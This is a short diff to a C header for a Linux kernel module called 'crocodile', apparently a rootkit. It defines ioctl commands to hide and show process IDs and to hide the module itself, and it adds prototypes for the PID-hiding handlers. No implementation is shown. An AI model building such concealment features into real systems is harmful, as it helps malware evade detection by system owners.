@@ -19,6 +19,8 @@
 #ifndef _CROCODILE_LKM_DEVICE_IOCTL_CMD_H_
 #define _CROCODILE_LKM_DEVICE_IOCTL_CMD_H_
 
+#include "device/types.h"
+
 /******************************************************************************
  * Ioctl definitions
  ******************************************************************************/
@@ -34,6 +36,10 @@
 #define CROC_IOC_SHOW_PID       _IOW(CROC_IOC_MAGIC,  2, int)
 #define CROC_IOC_HIDE_MODULE    _IOW(CROC_IOC_MAGIC,  3, int)
 #define CROC_IOC_SHOW_MODULE    _IOW(CROC_IOC_MAGIC,  4, int)
+
+int ioc_hide_pid(module_dev_t* p_dev, pid_t pid);
+
+int ioc_show_pid(module_dev_t* p_dev, pid_t pid);
 
 #endif /* _CROCODILE_LKM_DEVICE_IOCTL_CMD_H_ */
 
